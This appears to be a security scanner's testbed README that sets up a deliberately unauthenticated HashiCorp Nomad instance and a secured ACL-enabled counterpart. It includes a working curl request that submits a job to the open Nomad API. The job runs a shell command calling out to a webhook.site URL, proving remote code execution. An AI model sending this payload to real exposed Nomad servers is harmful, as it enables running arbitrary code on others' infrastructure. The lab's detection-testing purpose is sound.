# setup an unauthenticated nomad ui (vulnerable)
you can install nomad cli according to the official document: https://developer.hashicorp.com/nomad/install
OR base on ubuntu 24.04 with docker run the following command to run nomad:
## Warnings
1. The containers will run with `--privileged`.
2. the container doesn't run on the Apple Silicon
```bash
sudo docker run --rm -it \
  --privileged -v /sys/fs/cgroup:/sys/fs/cgroup:rw \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -p 4646:4646 \
  hashicorp/nomad:1.10 \
  agent -dev -bind 0.0.0.0 -network-interface='{{ GetDefaultInterfaces | attr "name" }}'
```

# confirming the exposed ui
```bash
# replace the COMMAND_HERE with your command like `curl url`
curl 'http://localhost:4646/v1/jobs' -X POST  -H 'content-type: application/json; charset=utf-8' --data-raw '{"Job":{"Affinities":null,"AllAtOnce":false,"Constraints":null,"ConsulNamespace":"","CreateIndex":0,"Datacenters":["dc1"],"DispatchIdempotencyToken":null,"Dispatched":false,"ID":"tsunami-job","JobModifyIndex":0,"Meta":null,"Migrate":null,"ModifyIndex":0,"Multiregion":null,"Name":"tsunami-job","Namespace":"default","NodePool":"","NomadTokenID":"","ParameterizedJob":null,"ParentID":"","Payload":null,"Periodic":null,"Priority":50,"Region":"global","Reschedule":null,"Spreads":null,"Stable":false,"Status":"","StatusDescription":"","Stop":false,"SubmitTime":null,"TaskGroups":[{"Affinities":null,"Constraints":null,"Consul":null,"Count":1,"Disconnect":null,"EphemeralDisk":{"Migrate":false,"SizeMB":300,"Sticky":false},"MaxClientDisconnect":null,"Meta":null,"Migrate":null,"Name":"curl","Networks":null,"PreventRescheduleOnLost":null,"ReschedulePolicy":{"Attempts":1,"Delay":5000000000,"DelayFunction":"constant","Interval":86400000000000,"MaxDelay":0,"Unlimited":false},"RestartPolicy":{"Attempts":3,"Delay":15000000000,"Interval":86400000000000,"Mode":"fail","RenderTemplates":false},"Scaling":null,"Services":null,"ShutdownDelay":null,"Spreads":null,"StopAfterClientDisconnect":null,"Tasks":[{"Actions":null,"Affinities":null,"Artifacts":null,"Config":{"args":["-lc","curl https://webhook.site/4005ef73-683e-4d8d-be9e-54253eb2f2b2"],"image":"curlimages/curl:8.8.0","command":"sh"},"Constraints":null,"Consul":null,"DispatchPayload":null,"Driver":"docker","Env":null,"Identities":null,"Identity":null,"KillSignal":"","KillTimeout":5000000000,"Kind":"","Leader":false,"Lifecycle":null,"LogConfig":{"Disabled":false,"Enabled":null,"MaxFileSizeMB":10,"MaxFiles":10},"Meta":null,"Name":"run-curl","Resources":{"CPU":100,"Cores":0,"Devices":null,"DiskMB":null,"IOPS":null,"MemoryMB":64,"MemoryMaxMB":null,"NUMA":null,"Networks":null,"SecretsMB":null},"RestartPolicy":{"Attempts":3,"Delay":15000000000,"Interval":86400000000000,"Mode":"fail","RenderTemplates":false},"ScalingPolicies":null,"Schedule":null,"Services":null,"ShutdownDelay":0,"Templates":null,"User":"","Vault":null,"VolumeMounts":null}],"Update":null,"Volumes":null}],"Type":"batch","UI":null,"Update":null,"VaultNamespace":"","Version":0,"VersionTag":null,"meta":{}},"Submission":{"Source":"job \"tsunami-job\" {\n  datacenters = [\"dc1\"]\n  type        = \"batch\"\n\n  group \"curl\" {\n    count = 1\n\n    task \"run-curl\" {\n      driver = \"docker\"\n\n      config {\n        image = \"curlimages/curl:8.8.0\"\n        command = \"sh\"\n        args = [\n          \"-lc\",\n          \"\"\n        ]\n      }\n\n      resources {\n        cpu    = 100\n        memory = 64\n      }\n    }\n  }\n}","Format":"hcl2"}}'

# clean up
curl 'http://localhost:4646/v1/job/tsunami-job?purge=true' -X DELETE -H 'content-type: application/json; charset=utf-8'
```

# setup an authenticated nomad ui (safe)
This version enables Nomad's ACL system, which requires a valid token for all API and UI access.
```bash
sudo docker run --rm -it \
  --name nomad-safe \
  --privileged -v /sys/fs/cgroup:/sys/fs/cgroup:rw \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -p 4646:4646 \
  hashicorp/nomad:1.10 \
  agent -dev -bind 0.0.0.0 -network-interface='{{ GetDefaultInterfaces | attr "name" }}' \
  -acl-enabled
```

After the agent starts, bootstrap the ACL system to get a management token:
```bash
sudo docker exec nomad-safe nomad acl bootstrap
```
This will output a `Secret ID` (the management token). All subsequent API/UI requests require this token.

# confirming the safe setup
Without a valid token, API requests are rejected with a 403:
```bash
curl 'http://localhost:4646/v1/jobs'
# Permission denied
```
With the management token, requests succeed:
```bash
# Replace <TOKEN> with the Secret ID from the bootstrap step
curl -H "X-Nomad-Token: <TOKEN>" 'http://localhost:4646/v1/jobs'
# Expected output(when there is no job): []
```
